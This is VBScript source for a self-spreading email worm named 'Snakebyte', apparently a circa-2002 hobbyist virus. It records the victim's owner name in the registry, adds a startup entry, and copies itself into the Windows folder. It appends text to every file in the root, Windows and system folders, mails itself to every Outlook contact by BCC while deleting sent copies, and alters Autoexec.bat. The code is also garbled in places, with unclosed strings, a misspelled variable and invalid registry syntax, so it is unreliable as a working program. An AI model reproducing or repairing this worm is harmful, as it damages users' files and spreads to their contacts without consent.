   Dim KefrensTempFile, RegWindir, RegRootdir, RegTempdir, RegSysdir, Winfiles, Rootfiles, Sysfiles, KefrensWorkingFile, InfectedFiles
   Set Kefrens = CreateObject("Scripting.FileSystemObject")
   Set KefrensReg = CreateObject("WScript.Shell")
   KefrensTempFile = Kefrens.GetTempName
   Const WindowsFolder = 0, SystemFolder = 1, TemporaryFolder = 2
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\Info\Coder", "Snakebyte"
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\Info\Group", "Kefrens"
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\Info\Release", "Snakebyte 1.0 at 06.Feb 2002"
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\Info\Victim", KefrensReg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\Stat\Infected", Now   ' Time stamp infection
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\Stat\IDNumber", (000007 * Rnd)+1
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\WinDir", Kefrens.GetSpecialFolder(WindowsFolder)
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\RootDir", Kefrens.GetFolder("C:\")
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\TempDir", Kefrens.GetSpecialFolder(TemporaryFolder)
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\SysDir", Kefrens.GetSpecialFolder(SystemFolder)
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", @="command /c for %i in (%windir%\\system\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
   RegWindir = KefrensReg.RegRead("HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\WinDir")
   RegRootdir = KefrensReg.RegRead("HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\RootDir")
   RegTempdir = KefrensReg.RegRead("HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\TempDir")
   RegSysdir = KefrensReg.RegRead("HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\SysDir")
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\WorkingFile", RegTempDir & "\" & KefrensTempFile
   Set WinDirF = Kefrens.GetFolder(RegWinDir)
   Set RootDirF = Kefrens.GetFolder(RegRootdir)
   Set SysDirF = Kefrens.GetFolder(RegSysdir)
   Set KefrensGet = Kefrens.GetFile("Snakebyte.vbs")
   Set KefrensParent = KefrensGet.Path
   Set KefrensLocation = KefrenseParent & "\" & "Snakebyte.vbs"
   Set KefrensIsHere = Kefrens.GetFile(KefrensLocation)
   KefrensIsHere.Copy (WindirF & "Snakebyte.vbs)
   Set Winfiles = WinDirF.Files
   Set Rootfiles = RootDirF.Files
   Set Sysfiles = SysDirF.Files
   KefrensWorkingFile = KefrensReg.RegRead("HKEY_LOCAL_MACHINE\Software\Snakebyte\RunInfo\WorkingFile")
   Set KefrensInfoFile = Kefrens.CreateTextFile(KefrensWorkingFile,True,False)
   For Each FileInRoot in Rootfiles
   CompleteFileName = RegRootDir & FileInRoot.name
   KefrensInfoFile.WriteLine(CompleteFileName)
   Next
   For Each FileInWin in Winfiles
   CompleteFileName = RegWindir & "\" & FileInWin.name
   KefrensInfoFile.WriteLine(CompleteFileName)
   Next
   For Each FileInSys in Sysfiles
   CompleteFileName = RegSysdir & "\" & FileInSys.name
   KefrensInfoFile.WriteLine(CompleteFileName)
   Next
   KefrensInfoFile.Close
   Const KefrensRead = 1, KefrensWrite = 2, KefrensAppend = 8
   Set SnakebyteInfo = Kefrens.OpenTextFile(KefrensWorkingFile, KefrensRead)
   Do While SnakebyteInfo.AtEndOfStream <> True
   OpenSnakebyte = SnakebyteInfo.readline
   InfectedFiles = 0
   Set TakDaFile = Kefrens.OpenTextFile(OpenSnakebyte, KefrensAppend)
   TakDaFile.WriteLine("See self at WWW.Kefrens.de/Snakebyte/indexx.htm")
   TakDaFile.WriteLine("Snakebyte Bye Snakebyte")
   TakDaFile.Close
   InfectedFiles = InfectedFiles + 1
   Loop
   SnakebyteInfo.Close
   KefrensReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Snakebyte\Stat\Infected Files", InfectedFiles
   Set SnakebyteEliminate = Kefrens.GetFile(KefrensInfoFile)
   SnakebyteEliminate.Delete
   Set KefrensOutlook = CreateObject("Outlook.Application")
   Set KefrensMapi = KefrensOutlook.GetNameSpace("MAPI")
   For Each KefrensRecipient In KefrensMapi.AddressLists
   If KefrensRecipient.AddressEntries.Count <> 0 Then
   Set KefrensEmail = KefrensOutlook.CreateItem(0)
   For KefrensCount = 1 To KefrensRecipient.AddressEntries.Count
   Set KefrensEntries = KefrensRecipient.AddressEntries(KefrensCount)
   If KefrensCount = 1 Then
   KefrensEmail.BCC = KefrensEntries.Address
   Else
   KefrensEmail.BCC = KefrensEmail.BCC & "; " & KefrensEntries.Address
   End If
   Next
   KefrensEmail.Subject = "Look  The Kefren´s has ReOpened his Fantastic Side"
   KefrensEmail.Body = "I found this really Cool Site again, Visit the file and Visit self The Group. Bye Snakebyte the Leader of this own Group"
   KefrensEmail.Attachments.Add KefrensIsHere
   KefrensEmail.DeleteAfterSubmit = True
   KefrensEmail.Send
   End If
   Next
   SetAttr "C:\Autoexec.bat", vbArchive Or vbNormal
   Open "C:\Autoexec.bat" For Input As 1
   Do While LinePay <> "ECHO  I-Worm.VBS.Snakebyte" And EOF(1) = False
   Line Input #1, LinePay
   Loop
   If LinePay = "ECHO  I-Worm.VBS.Snakebyte" Then
   Close #1
   Else
   Close #1
   Open "C:\Autoexec.bat" For Append As 1
   Print #1, ""
   Print #1, "@ECHO OFF"
   Print #1, "CLS"
   Print #1, "ECHO   Snakebyte             Snakebyte
   Print #1, "ECHO    Snakebyte   Number  Snakebyte
   Print #1, "ECHO     Snakebyte         Snakebyte
   Print #1, "ECHO      Snakebyte       Snakebyte
   Print #1, "ECHO       Snakebyte     Snakebyte
   Print #1, "ECHO        Snakebyte   Snakebyte
   Print #1, "ECHO         Snakebyte Snakebyte
   Print #1, "ECHO    Snakebyte           Snakebyte
   Print #1, "ECHO     Snakebyte         Snakebyte
   Print #1, "ECHO      Snakebyte  One  Snakebyte
   Print #1, "ECHO       Snakebyte     Snakebyte
   Print #1, "ECHO        Snakebyte   Snakebyte
   Print #1, "ECHO         Snakebyte Snakebyte
   Print #1, "PAUSE"
   Print #1, "CLS"
   Close #1
   End If
   Next
